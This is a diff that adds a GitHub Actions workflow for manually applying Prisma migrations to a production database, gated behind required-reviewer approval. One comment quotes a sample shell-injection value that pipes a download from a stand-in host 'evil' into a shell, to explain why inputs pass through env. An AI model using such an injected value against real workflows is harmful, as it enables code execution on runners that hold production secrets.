@@ -1,0 +1,89 @@
+name: Deploy Migrations
+
+# Manual-only, on purpose — this is the actual gate for running
+# `prisma migrate deploy` against the real production database. No
+# push/pull_request trigger exists here at all, unlike ci.yml (which
+# only ever runs migrate deploy against a throwaway, ephemeral
+# per-job Postgres container that's destroyed when the job ends).
+#
+# The real protection isn't this YAML file — it's the `environment:
+# production` key below, combined with a GitHub Environment named
+# "production" configured with "Required reviewers" in this repo's
+# Settings -> Environments. That combination is what makes GitHub
+# actually block the job (and withhold its environment-scoped secrets)
+# until a required reviewer approves this specific run — not a hardware
+# check, not a client-side gate, a real, non-bypassable server-side
+# approval step enforced by GitHub itself. Nothing in this file can
+# create that Environment or its reviewer list from the outside; both
+# are one-time manual setup (Settings -> Environments -> New environment
+# -> name it "production" -> add required reviewers -> add
+# PRODUCTION_DATABASE_URL as an *environment* secret, not a repository
+# secret — an environment secret is what's actually withheld pending
+# approval; a repository secret is available to any workflow regardless
+# of this gate).
+on:
+  workflow_dispatch:
+    inputs:
+      confirm:
+        description: 'Type "deploy" to confirm — this applies pending migrations to production.'
+        required: true
+
+jobs:
+  deploy:
+    name: Apply pending migrations to production
+    runs-on: ubuntu-latest
+    environment: production
+
+    steps:
+      # CONFIRM_INPUT is passed via `env:`, never spliced straight into
+      # `run:` via ${{ }} — interpolating github.event.inputs.* directly
+      # into a shell script's source lets a crafted input (e.g. one
+      # containing `"; curl evil | sh #`) inject arbitrary commands into
+      # a runner that's about to hold PRODUCTION_DATABASE_URL. Semgrep's
+      # yaml.github-actions.security.run-shell-injection rule caught the
+      # first draft of this step doing exactly that.
+      - name: Check confirmation input
+        env:
+          CONFIRM_INPUT: ${{ github.event.inputs.confirm }}
+        run: |
+          if [ "$CONFIRM_INPUT" != "deploy" ]; then
+            echo "Confirmation input must be exactly 'deploy'. Aborting."
+            exit 1
+          fi
+
+      - name: Check out repository
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+
+      - name: Set up Node.js 22
+        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+        with:
+          node-version: "22"
+          cache: npm
+
+      - name: Install dependencies
+        run: npm ci
+
+      # Informational only — surfaces exactly what's about to change in
+      # the job log, so the required reviewer who approved this run (and
+      # anyone auditing it afterward) can see the real diff, not just
+      # trust that "deploy" was typed correctly. `migrate status` never
+      # mutates anything.
+      - name: Show pending migrations
+        env:
+          DATABASE_URL: ${{ secrets.PRODUCTION_DATABASE_URL }}
+        run: npx prisma migrate status || true
+
+      # `migrate deploy`, not `migrate dev` — same reasoning as
+      # ci.yml's identical step: non-interactive, no drift-detection
+      # prompts, applies exactly the committed migration files. Uses
+      # PRODUCTION_DATABASE_URL specifically (an *environment* secret on
+      # "production", never the same value as ci.yml's throwaway
+      # DATABASE_URL, which only ever points at an ephemeral test
+      # container) — this is the pfw_app-equivalent, RLS-bypassing
+      # bootstrap-owner credential for the real database; see AGENTS.md
+      # §3a for why that role exists and why it's never the role the
+      # running app itself connects as.
+      - name: Apply pending migrations
+        env:
+          DATABASE_URL: ${{ secrets.PRODUCTION_DATABASE_URL }}
+        run: npm run db:migrate:deploy
